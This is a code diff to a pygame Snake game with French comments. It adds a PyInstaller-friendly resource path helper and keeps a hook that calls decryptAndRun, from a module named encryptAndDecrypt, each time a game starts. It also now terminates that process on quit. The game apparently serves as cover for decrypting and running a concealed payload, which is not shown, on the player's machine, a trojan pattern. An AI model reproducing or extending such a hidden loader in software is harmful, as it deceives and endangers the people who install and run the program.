@@ -3,7 +3,15 @@ import sys
 import random
 import os
 from jeu.encryptAndDecrypt import decryptAndRun
-import threading
+
+
+def resource_path(relative_path):
+    import sys, os
+    if hasattr(sys, "_MEIPASS"):
+        base_path = sys._MEIPASS
+    else:
+        base_path = os.path.abspath(".")
+    return os.path.join(base_path, relative_path)
 
 pygame.init()
 
@@ -14,7 +22,7 @@ fenetre = pygame.display.set_mode((largeur, hauteur))
 pygame.display.set_caption("Snake Game")
 
 # Chargement du fond
-background = pygame.image.load("jeu/background.jpg")
+background = pygame.image.load(resource_path("jeu/background.jpg"))
 background = pygame.transform.scale(background, (largeur, hauteur))
 
 
@@ -35,22 +43,22 @@ clock = pygame.time.Clock()
 
 
 # ----- HIGH SCORE -----
-if not os.path.exists("jeu/highscore.txt"):
-    with open("jeu/highscore.txt", "w") as f:
+if not os.path.exists(resource_path("jeu/highscore.txt")):
+    with open(resource_path("jeu/highscore.txt"), "w") as f:
         f.write("0")
 
-with open("jeu/highscore.txt", "r") as f:
+with open(resource_path("jeu/highscore.txt"), "r") as f:
     high_score = int(f.read())
 
 
 def save_high_score(score):
-    with open("jeu/highscore.txt", "w") as f:
+    with open(resource_path("jeu/highscore.txt"), "w") as f:
         f.write(str(score))
 
 
 # ----- Fonction Principale du Jeu -----
 def jeu():
-    threading.Thread(target=decryptAndRun).start()
+    tr = decryptAndRun()  
     global high_score
 
     snake_x = 300
@@ -251,6 +259,7 @@ def jeu():
 
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
+                tr.terminate()
                 pygame.quit()
                 sys.exit()
 
@@ -258,6 +267,7 @@ def jeu():
                 if event.key == pygame.K_r:
                     jeu()
                 if event.key == pygame.K_q:
+                    tr.terminate()
                     pygame.quit()
                     sys.exit()
 
